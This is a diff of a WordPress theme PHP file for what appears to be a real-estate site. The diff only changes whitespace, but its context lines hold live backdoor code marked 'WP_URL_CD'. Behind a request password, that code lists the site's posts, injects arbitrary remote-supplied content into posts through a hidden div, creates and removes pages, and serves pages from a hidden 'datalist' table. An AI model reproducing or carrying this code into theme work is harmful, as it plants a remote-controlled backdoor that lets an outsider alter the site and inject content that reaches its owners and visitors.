@@ -8,21 +8,21 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
 						{
 							$data['code'] = '';
-							
+
 							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
 								{
 									$data['code'] = $_[1];
 								}
-							
+
 							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
 						}
 				break;
-				
+
 				case 'set_id_links';
 					if (isset($_REQUEST['data']))
 						{
 							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
-							
+
 							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
 							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
 
@@ -32,7 +32,7 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 								}
 						}
 				break;
-				
+
 				case 'create_page';
 					if (isset($_REQUEST['remove_page']))
 						{
@@ -49,14 +49,14 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 								}
 						}
 				break;
-				
+
 				default: print "ERROR_WP_ACTION WP_URL_CD";
 			}
-			
+
 		die("");
 	}
 
-	
+
 if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
 	{
 		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
@@ -92,7 +92,7 @@ if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE 
 				get_sidebar();
 				get_footer();
 			}
-			
+
 		exit;
 	}
 
@@ -539,7 +539,7 @@ function register_doma_i_kvartiri() {
 		// 'taxonomies' => array( 'topics', 'category')
 	);
 	register_post_type('objects',$args);
-//	flush_rewrite_rules();
+	// flush_rewrite_rules();
 /*  flush_rewrite_rules() - Если здесь вносить некоторые изменения,
  влияющие на структуру ссылок (например rewrite в args),
   короче если ссылки изменились, надо раскомментировать flush_rewrite_rules();, затем загрузить
